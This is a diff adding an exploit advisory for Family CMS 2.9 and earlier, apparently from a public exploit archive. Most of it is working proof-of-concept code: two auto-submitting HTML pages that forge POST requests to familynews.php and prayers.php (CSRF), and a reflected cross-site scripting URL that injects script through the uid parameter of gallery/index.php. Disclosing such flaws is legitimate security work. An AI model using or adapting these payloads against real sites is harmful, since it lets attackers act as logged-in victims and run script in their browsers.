@@ -1,0 +1,67 @@
+Family CMS 2.9  and earlier multiple Vulnerabilities
+===================================================================================
+# Exploit Title: Family CMS 2.9  and earlier multiple Vulnerabilities
+# Download link :http://sourceforge.net/projects/fam-connections/files/Family%20Connections/2.9/FCMS_2.9.zip/download
+# Author: Ahmed Elhady Mohamed
+# Email : ahmed.elhady.mohamed@gmail.com
+# version: 2.9
+# Category: webapps
+# Tested on: ubuntu 11.4  
+===================================================================================
+ 
+ 
+ Tips:
+	*****First we must install all optional sections during installation process.*****       
+	      
+1- CSRF Vulnerabilities :
+
+	POC 1: Page "familynews.php"
+	     
+	   
+		<html>
+		    <head>
+		        <script type="text/javascript">
+		            function autosubmit() {
+		                document.getElementById('ChangeSubmit').submit();
+		            }  
+		        </script>
+		    </head>
+		    <body  onLoad="autosubmit()">
+		        <form method="POST"  action="http://[localhost]/FCMS_2.9/familynews.php"  id="ChangeSubmit">
+		            <input type="hidden"  name="title"  value="test" />
+		            <input type="hidden"  name="submitadd"  value="Add" />
+		            <input type="hidden"  name="post"  value="testcsrf" />
+		            <input type="submit" value="submit"/>
+		        </form>
+		    </body>
+		</html>
+	 
+	 --------------------------------------------------------------------------------------------------------
+	    
+	 POC 2:Page "prayers.php"
+	    
+
+	      <html>
+		<head>
+		    <script type="text/javascript">
+		        function autosubmit() {
+		            document.getElementById('ChangeSubmit').submit();
+		        }  
+		    </script>
+		</head>
+		<body  onLoad="autosubmit()">
+		    <form method="POST"  action="http://[localhost]/FCMS_2.9/prayers.php" id="ChangeSubmit">
+		        <input type="hidden"  name="for"  value="test" />
+		        <input type="hidden"  name="submitadd"  value="Add" />
+		        <input type="hidden"  name="desc"  value="testtest" />
+		        <input type="submit" value="submit"/>
+		    </form>
+		 
+		</body>
+	    </html>
+----------------------------------------------------------------------------------------------------------------------------
+2-Reflected XSS
+	
+	POC :   http://[localhost]/fcms_2.9/gallery/index.php?uid=%22%3E%3Cscript%3Ealert%28/xss/%29%3C/script%3E
+
+-----------------------------------------------------------------------------------------------------------------------------
